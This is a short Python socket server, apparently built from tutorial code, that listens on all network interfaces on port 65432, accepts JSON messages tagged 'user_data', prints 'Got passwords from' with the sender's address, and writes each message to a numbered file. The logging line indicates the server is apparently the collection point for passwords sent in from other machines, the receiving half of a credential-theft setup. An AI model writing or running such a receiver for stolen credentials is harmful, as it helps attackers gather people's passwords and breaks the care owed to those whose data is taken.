# first of all import the socket library
import socket
import json

num = 0
BUFFER_LEN = 33554432
port = 65432
# next create a socket object
s = socket.socket()
print("Socket successfully created")

# reserve a port on your computer in our
# case it is 12345 but it can be anything


# Next bind to the port
# we have not typed any ip in the ip field
# instead we have inputted an empty string
# this makes the server listen to requests
# coming from other computers on the network
s.bind(('', port))
print("socket binded to %s" % (port))

# put the socket into listening mode
s.listen(5)
print("socket is listening")

# a forever loop until we interrupt it or
# an error occurs
while True:
    # Establish connection with client.
    c, addr = s.accept()

    recvMe = c.recv(BUFFER_LEN).decode()
    jsonMe = json.loads(recvMe)

    if jsonMe.__contains__("type") == True and jsonMe.__contains__("ipv6") == True:
        if jsonMe["type"] == "user_data":

            name = str(num)+".json"
            num = num + 1

            print('Got passwords from', addr)

            with open(name, "w") as outfile:
                outfile.write(json.dumps(jsonMe, indent=4))
                outfile.close()


    # Close the connection with the client
    c.close()

    # Breaking once connection closed
